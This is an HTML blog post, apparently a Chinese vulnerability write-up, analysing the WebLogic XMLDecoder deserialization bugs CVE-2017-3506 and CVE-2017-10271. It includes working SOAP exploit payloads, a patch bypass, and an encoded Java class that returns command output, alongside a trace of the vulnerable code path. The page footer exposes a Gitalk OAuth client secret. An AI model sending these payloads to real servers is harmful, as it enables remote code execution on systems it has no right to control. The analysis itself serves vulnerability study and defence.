@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>CVE-2017-3506 &amp; CVE-2017-10271 |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="CVE-2017-3506 &amp; CVE-2017-10271 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="CVE-2017-3506 &amp; CVE-2017-10271"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/TsCTC6Ohu/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>CVE-2017-3506 &amp; CVE-2017-10271</h1>
+            <span class="meta">
+            	Posted on
+              2021-01-25，7 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="cve-2017-3506">CVE-2017-3506</h1>
+<p>EXP:</p>
+<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soapenv:Header&gt;
+    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+        &lt;java version=&quot;1&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+          &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;
+            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+              &lt;void index=&quot;0&quot;&gt;
+                &lt;string&gt;cmd.exe&lt;/string&gt;
+              &lt;/void&gt;
+              &lt;void index=&quot;1&quot;&gt;
+                &lt;string&gt;/c&lt;/string&gt;
+              &lt;/void&gt;
+              &lt;void index=&quot;2&quot;&gt;
+                &lt;string&gt;calc.exe&lt;/string&gt;
+              &lt;/void&gt;
+            &lt;/array&gt;
+          &lt;void method=&quot;start&quot;/&gt;&lt;/object&gt;
+        &lt;/java&gt;
+      &lt;/work:WorkContext&gt;
+    &lt;/soapenv:Header&gt;
+  &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre>
+<p>首先入口点断在<code>wlserver_10.3/server/lib/weblogic.jar/weblogic/wsee/jaxws/workcontext/WorkContextServerTube/processRequest</code>方法</p>
+<pre><code>    public NextAction processRequest(Packet var1) {
+        this.isUseOldFormat = false;
+        if (var1.getMessage() != null) {
+            //var1就是我们POST的xml
+            HeaderList var2 = var1.getMessage().getHeaders();
+            //判断是否有xml消息头
+            Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true);
+            //根据WorkAreaConstants.WORK_AREA_HEADER定义的值。获取中间的内容。也就是我们xml的内容
+            if (var3 != null) {
+                this.readHeaderOld(var3);
+                this.isUseOldFormat = true;
+            }
+
+            Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true);
+            if (var4 != null) {
+                this.readHeader(var4);
+            }
+        }
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1611749905398.png" alt="" loading="lazy"><br>
+将获取到的恶意xmlpayload带入readHeaderOld方法</p>
+<pre><code>    protected void readHeaderOld(Header var1) {
+        try {
+            XMLStreamReader var2 = var1.readHeader();
+            var2.nextTag();
+            var2.nextTag();
+            XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter();
+            ByteArrayOutputStream var4 = new ByteArrayOutputStream();
+            //创建了一个输出流
+            XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);
+            //往输出流里面写入了XML
+            var3.bridge(var2, var5);
+            var5.close();
+            WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray()));
+            //this.xmlDecoder = new XMLDecoder(var1); 把我们的恶意xml 实例化了赋值给了WorkContextXmlInputAdapter.xmlDecoder属性
+            this.receive(var6);
+            //根入receive方法。这里把WorkContextXmlInputAdapter对象传入了
+        } catch (XMLStreamException var7) {
+            throw new WebServiceException(var7);
+        } catch (IOException var8) {
+            throw new WebServiceException(var8);
+        }
+    }
+</code></pre>
+<pre><code>  protected void receive(WorkContextInput var1) throws IOException {
+        WorkContextMapInterceptor var2 = WorkContextHelper.getWorkContextHelper().getInterceptor();
+        var2.receiveRequest(var1);
+        //继续跟踪var1.进入receiveRequest方法
+    }
+</code></pre>
+<pre><code>    public void receiveRequest(WorkContextInput var1) throws IOException {
+        ((WorkContextMapInterceptor)this.getMap()).receiveRequest(var1);
+        //跟进receiveRequest方法
+    }
+</code></pre>
+<pre><code>    public void receiveRequest(WorkContextInput var1) throws IOException {
+        while(true) {
+            try {
+                WorkContextEntry var2 = WorkContextEntryImpl.readEntry(var1);
+                //这个var1还是WorkContextXmlInputAdapter。进入了readEntry方法
+                。。。。。。。
+</code></pre>
+<pre><code>    public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException {
+        String var1 = var0.readUTF();
+        //调用了WorkContextXmlInputAdapter对象的readUTF方法
+        return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0));
+    }
+</code></pre>
+<pre><code>    public String readUTF() throws IOException {
+        return (String)this.xmlDecoder.readObject();
+        //最终调用了xmlDecoder.readObject
+    }
+</code></pre>
+<p>补丁如下：</p>
+<pre><code>private void validate(InputStream is) {
+    WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
+    try {
+        SAXParser parser = factory.newSAXParser();
+        parser.parse(is, new DefaultHandler() {
+            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
+                if(qName.equalsIgnoreCase(“object”)) {
+                    throw newIllegalStateException(“Invalid context type: object”);
+                }
+            }
+        });
+    } catch(ParserConfigurationException var5) {
+        throw new IllegalStateException(“Parser Exception”, var5);
+    } catch(SAXException var6) {
+        throw new IllegalStateException(“Parser Exception”, var6);
+    } catch(IOException var7) {
+        throw new IllegalStateException(“Parser Exception”, var7);
+    }
+}
+</code></pre>
+<p>如果xml标签中qName的值为object就报错。黑名单。。可以绕。所以出现了CVE-2017-10271</p>
+<h1 id="cve-2017-10271">CVE-2017-10271</h1>
+<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soapenv:Header&gt;
+    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+        &lt;java version=&quot;1&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+          &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
+            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+              &lt;void index=&quot;0&quot;&gt;
+                &lt;string&gt;cmd.exe&lt;/string&gt;
+              &lt;/void&gt;
+              &lt;void index=&quot;1&quot;&gt;
+                &lt;string&gt;/c&lt;/string&gt;
+              &lt;/void&gt;
+              &lt;void index=&quot;2&quot;&gt;
+                &lt;string&gt;calc.exe&lt;/string&gt;
+              &lt;/void&gt;
+            &lt;/array&gt;
+          &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
+        &lt;/java&gt;
+      &lt;/work:WorkContext&gt;
+    &lt;/soapenv:Header&gt;
+  &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre>
+<p>从PAYLOAD中可以看出。这里直接把object换成了void 也可以正常执行。之后还有调用各种类。然后二次xmldecode的绕过。</p>
+<p>回显构造</p>
+<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+    &lt;soapenv:Header&gt;
+        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+            &lt;java&gt;
+                &lt;void class=&quot;weblogic.utils.Hex&quot; method=&quot;fromHexString&quot; id=&quot;cls&quot;&gt;
+                    &lt;string&gt;0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void class=&quot;org.mozilla.classfile.DefiningClassLoader&quot;&gt;
+                    &lt;void method=&quot;defineClass&quot;&gt;
+                        &lt;string&gt;com.supeream.exploits.XmlExp&lt;/string&gt;
+                        &lt;object idref=&quot;cls&quot;&gt;&lt;/object&gt;
+                        &lt;void method=&quot;newInstance&quot;&gt;
+                            &lt;void method=&quot;say&quot; id=&quot;proc&quot;&gt;
+                                &lt;string&gt;whoami&lt;/string&gt;
+                            &lt;/void&gt;
+                        &lt;/void&gt;
+                    &lt;/void&gt;
+                &lt;/void&gt;
+                &lt;void class=&quot;java.lang.Thread&quot; method=&quot;currentThread&quot;&gt;
+                    &lt;void method=&quot;getCurrentWork&quot;&gt;
+                        &lt;void method=&quot;getResponse&quot;&gt;
+                            &lt;void method=&quot;getServletOutputStream&quot;&gt;
+                                &lt;void method=&quot;writeStream&quot;&gt;
+                                    &lt;object idref=&quot;proc&quot;&gt;&lt;/object&gt;
+                                &lt;/void&gt;
+                                &lt;void method=&quot;flush&quot;/&gt;
+                            &lt;/void&gt;
+                            &lt;void method=&quot;getWriter&quot;&gt;&lt;void method=&quot;write&quot;&gt;&lt;string&gt;&lt;/string&gt;&lt;/void&gt;&lt;/void&gt;
+                        &lt;/void&gt;
+                    &lt;/void&gt;
+                &lt;/void&gt;
+            &lt;/java&gt;
+        &lt;/work:WorkContext&gt;
+    &lt;/soapenv:Header&gt;
+    &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre>
+<pre><code>http://whip1ash.cn/2018/10/21/weblogic-deserialization/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA
+</code></pre>
+<pre><code>https://blog.51cto.com/skytina/2055335
+</code></pre>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/gS01eEZwU/">
+              <span class="post-title">
+                HXP resonator(利用file_put_contents打SSRF)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
